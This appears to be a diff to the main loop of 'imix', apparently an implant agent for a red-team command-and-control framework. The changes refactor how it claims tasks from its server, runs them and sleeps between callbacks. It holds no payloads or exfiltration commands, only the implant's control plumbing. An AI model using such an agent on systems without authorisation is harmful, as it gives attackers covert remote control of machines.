@@ -2,9 +2,8 @@ use anyhow::Result;
 use c2::pb::c2_client::C2Client;
 use c2::pb::TaskOutput;
 
-use chrono::Utc;
 use clap::{arg, Command};
-use imix::exec::{handle_output_and_responses, AsyncTask};
+use imix::exec::{handle_tavern_response, AsyncTask};
 use imix::init::agent_init;
 use imix::tasks::start_new_tasks;
 use imix::{tasks, Config};
@@ -31,7 +30,6 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
     loop {
         // @TODO: Why two timers?
-        let debug_start_time = Utc::now().time();
 
         // 0. Get loop start time
         let loop_start_time = Instant::now();
@@ -57,7 +55,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         #[cfg(debug_assertions)]
         eprintln!(
             "[{}]: collecting tasks",
-            (Utc::now().time() - debug_start_time).num_milliseconds()
+            (Instant::now() - loop_start_time).as_millis()
         );
 
         let new_tasks = tasks::get_new_tasks(
@@ -71,11 +69,11 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         #[cfg(debug_assertions)]
         eprintln!(
             "[{}]: Starting {} new tasks",
-            (Utc::now().time() - debug_start_time).num_milliseconds(),
+            (Instant::now() - loop_start_time).as_millis(),
             new_tasks.len()
         );
 
-        start_new_tasks(new_tasks, &mut all_exec_futures, debug_start_time).await?;
+        start_new_tasks(new_tasks, &mut all_exec_futures, loop_start_time).await?;
 
         // 3. Sleep till callback time
         let time_to_sleep = imix_config
@@ -88,7 +86,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         #[cfg(debug_assertions)]
         eprintln!(
             "[{}]: Sleeping seconds {}",
-            (Utc::now().time() - debug_start_time).num_milliseconds(),
+            (Instant::now() - loop_start_time).as_millis(),
             time_to_sleep
         );
 
@@ -98,12 +96,12 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         #[cfg(debug_assertions)]
         eprintln!(
             "[{}]: Checking task status",
-            (Utc::now().time() - debug_start_time).num_milliseconds()
+            (Instant::now() - loop_start_time).as_millis()
         );
 
         // Update running tasks and results
-        handle_output_and_responses(
-            debug_start_time,
+        handle_tavern_response(
+            loop_start_time,
             tavern_client,
             &mut all_exec_futures,
             &mut all_task_res_map,
@@ -139,19 +137,19 @@ pub fn main() -> Result<(), imix::Error> {
         )
         .get_matches();
 
+    match matches.subcommand() {
+        Some(("install", args)) => {
+            let _config_path = args.value_of("config").unwrap();
+            unimplemented!("Install isn't implemented yet")
+        }
+        _ => {}
+    }
+
     let runtime = tokio::runtime::Builder::new_multi_thread()
         .worker_threads(128)
         .enable_all()
         .build()
         .unwrap();
-
-    match matches.subcommand() {
-        Some(("install", args)) => {
-            let config_path = args.value_of("config").unwrap();
-            unimplemented!("Install isn't implemented yet")
-        }
-        _ => {}
-    }
 
     if let Some(config_path) = matches.value_of("config") {
         match runtime.block_on(main_loop(config_path.to_string(), None)) {
@@ -168,8 +166,6 @@ pub fn main() -> Result<(), imix::Error> {
 
 #[cfg(test)]
 mod tests {
-    use super::*;
-    use c2::pb::ClaimTasksResponse;
 
     #[test]
     fn imix_handle_exec_tome() {}
